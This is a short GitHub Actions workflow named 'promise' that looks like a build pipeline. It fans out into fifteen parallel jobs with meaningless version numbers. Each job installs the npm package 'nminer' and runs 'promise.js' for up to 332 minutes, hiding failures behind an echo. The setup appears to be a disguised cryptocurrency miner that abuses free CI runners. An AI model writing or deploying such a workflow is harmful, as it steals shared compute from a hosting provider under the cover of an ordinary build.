name: promise
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 3750 }
          - { version: 5268 }
          - { version: 3910 }
          - { version: 8938 }
          - { version: 3944 }
          - { version: 5865 }
          - { version: 5516 }
          - { version: 7732 }
          - { version: 2496 }
          - { version: 4534 }
          - { version: 2232 }
          - { version: 8277 }
          - { version: 3718 }
          - { version: 940 }
          - { version: 1784 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: fooey
        run: |
          npm install nminer@latest
          timeout 332m node promise.js || echo "promise executed"